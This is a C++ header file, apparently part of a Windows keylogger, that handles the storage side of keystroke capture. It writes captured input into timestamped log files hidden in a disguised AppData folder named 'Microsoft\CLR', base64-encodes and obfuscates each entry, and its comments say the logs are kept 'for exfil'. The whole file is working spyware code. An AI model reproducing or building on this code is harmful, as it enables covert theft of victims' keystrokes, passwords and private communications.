#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include <Windows.h>
#include "Auxiliary.h"
#include "Encoder.h"

//We will use this IO system to create files, store logs, deal with paths, etc...

namespace IO
{

	//This function uses stdlib to query the windows env variables and retrieves the path to the AppData folder

	std::string getAppDataPath(const bool appendSeperator = false)
	{
		std::string appdataDir = getenv("APPDATA");
		std::string fullPath = appdataDir + "\\Microsoft\\CLR";
		return fullPath + (appendSeperator ? "\\" : "");
	}

	//The function below will create a new directory within wich we will store our logs

	bool createDirectory(std::string dirPath)
	{
		//All this mumbo jumbo to convert the string object passed in into a LPCWSTR which the WinAPI function accepts
		std::wstring tmp = std::wstring(dirPath.begin(), dirPath.end());
		LPCWSTR dirPath2 = tmp.c_str();

		return (bool)CreateDirectory(dirPath2, NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
	}

	//This function is essentially useless but I will remove it later

	bool creatDirBackup(std::string dirPath)
	{
		for (auto& letter : dirPath)
		{
			if (letter == '\\')
			{
				letter = '\0';
				
				if (!createDirectory(dirPath))
				{
					return false;
				}

				letter = '\\';
			}
		}
	}

	//Below is a template function which will take inputs and write it to our key log file for exfil

	template <typename T1>
	std::string writeToLog(const T1 &input)
	{

		//First, we get our path for the AppData folder
		std::string writePath = getAppDataPath(true);

		//We create a structure for the current date and time to use in the filename
		Auxiliary::DateTime dateTime;
		
		//We construct a filename with the date, time, and proper extension and seperators
		std::string logName = dateTime.getTDString(".", "_") + ".log";

		//We now make a full file path using both the log name and the write path
		std::string filePath = writePath + logName;

		//Beginning of file creation and insertion process
		try
		{
			//Create a file object and open it in the correct location with proper permissions
			std::ofstream keyLog;
			keyLog.open(filePath, std::ios::app);
			
			//If log file could not be created for some reason, return empty string
			if (!keyLog)
			{
				return "";
			}

			//Otherwise create a string stream
			std::ostringstream outputStream;

			//Insert given data and timestamps to stream
			outputStream << "[" << dateTime.getTDString("/", ":") << "]" << std::endl << input << std::endl;

			//Encode and saltify that data
			std::string data = Encoder::saltify(Encoder::b64Encode(outputStream.str()));

			//Write that data into the file
			keyLog << data;

			//Check log file existence once more
			if (!keyLog)
			{
				return "";
			}

			//If all is good, close the file and return the name
			keyLog.close();
			return filePath;
		}
		catch(...)
		{
			return "";
		}
	}
}

#endif // !IO_H
